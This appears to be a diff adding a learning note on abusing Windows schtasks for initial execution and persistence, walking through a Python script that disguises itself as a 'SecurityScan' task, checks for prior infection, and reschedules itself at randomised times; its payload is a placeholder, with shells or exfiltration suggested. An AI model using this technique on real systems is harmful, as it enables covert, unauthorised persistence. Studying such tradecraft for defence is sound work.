@@ -1,0 +1,86 @@
+
+This helps to understand the use of scheduled task to achieve initial execution and also maintain persistence on the system.
+
+1. Understand how schtasks works 
+schtasks /?
+
+Description:
+    Enables an administrator to create, delete, query, change, run and
+    end scheduled tasks on a local or remote system.
+
+Parameter List:
+    /Create         Creates a new scheduled task.
+
+    /Delete         Deletes the scheduled task(s).
+
+    /Query          Displays all scheduled tasks.
+
+    /Change         Changes the properties of scheduled task.
+
+    /Run            Runs the scheduled task on demand.
+
+    /End            Stops the currently running scheduled task.
+
+    /ShowSid        Shows the security identifier corresponding to a scheduled task name.
+
+    /?              Displays this help message.
+
+Examples:
+    SCHTASKS
+    SCHTASKS /?
+    SCHTASKS /Run /?
+    SCHTASKS /End /?
+    SCHTASKS /Create /?
+    SCHTASKS /Delete /?
+    SCHTASKS /Query  /?
+    SCHTASKS /Change /?
+    SCHTASKS /ShowSid /?
+
+2. To find all scheduled task 
+schtasks /Query /?
+ It output all scheduled with schedule info and its current status (Ready, running, disabled etc).
+
+3. In this learning, we taking advantage of schtasks to achieve initial access and persistence on target system.
+ Note: schtasks are used to schedule task on local as well as remote system.
+
+So we can use schtasks to run a file on a remote sysem for getting initial access and initial execution. Alternatively you may have ability to run terminal commandline  for mailcious word document etc and could use that to dump a file or download  a malicious file to system, and to schedule this task to run in future.
+
+
+Program starts:
+import os, random
+
+Importing few library such as OS , because we are going to use System and path command. 
+similary we imported random library. Because we are going to make our task scheduler to scheduling unpredictable
+
+from datetime import datetime,timedelta
+
+Then we are using datetime, because we want specify exactly when we want to run a particular files.
+
+if os.system("schtasks /query /tn SecurityScan") == 0:
+    os.system("schtasks /delete /f /tn SecurityScan")
+
+The above two line is used to determine, if a particular task/path been already been created in the system. So we could treat this as a mutex determining whether system already been affected etc...
+
+    
+print ("This script is up to no good...")
+
+Assume the above line is called as malicious functionality for this particular script. Note: This could be any functioanlity that you can write in python and assessed using os.system. Eg: this could help to create a shell to provide access to the system.. Eg: It could be automatically collecting exfiltrate data from the system etc.
+
+filedir = os.path.join(os.getcwd(), "TaskScheduler.py")
+
+The above code is for ensure the persistence of the particular program in the system. In this case, its about getting current working directory and building a path for this particular file.(May be earlier in download foleder, now in the cwd)
+
+maxInterval = 1
+interval = 1+(random.random()*(maxInterval-1))
+dt = datetime.now() + timedelta(minutes=interval)
+t = "%s:%s" % (str(dt.hour).zfill(2),str(dt.minute).zfill(2))
+d = "%s/%s/%s" % (str(dt.month).zfill(2),str(dt.day).zfill(2),dt.year)
+
+Then we are performing some time related operations to set the task.
+In our case, its a small interval of minute. If you want to create a completely predicatable task, you can use below command.
+schtask /create /? and determine which one is useful.
+
+os.system('schtasks /create /tn SecurityScan /tr \"%s\" /sc once /st %s /sd %s' % (filedir,t,d))
+input()
+
+Once the scheduling info is availble, we can use schtasks .   /create denotes , we want a new task
